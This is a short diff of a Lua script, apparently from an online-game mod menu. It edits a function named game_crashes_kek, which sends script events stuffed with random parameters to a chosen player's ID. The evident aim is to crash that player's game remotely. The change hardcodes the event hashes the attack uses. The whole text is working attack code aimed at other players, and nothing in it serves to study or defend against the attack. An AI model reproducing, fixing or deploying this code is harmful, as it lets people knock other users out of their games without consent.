@@ -473,9 +473,9 @@ function _Module.game_crashes_kek(target_pid)
             parameters[#parameters + 1] = math.random(-2147483647, 2147483647)
         end
         parameters[10] = target_pid
-        _Module.send_script_event(RB_G.eve.crs.kek[#RB_G.eve.crs.kek], target_pid, parameters)
+        _Module.send_script_event(677240627, target_pid, parameters)
     end
-    for _, script_hash in ipairs(RB_G.eve.crs.kek) do
+    for _, script_hash in ipairs({962740265, -1386010354, 2112408256, 677240627}) do
         local parameters = {target_pid}
         for i = 2, 10 do
             parameters[#parameters + 1] = math.random(-2147483647, 2147483647)
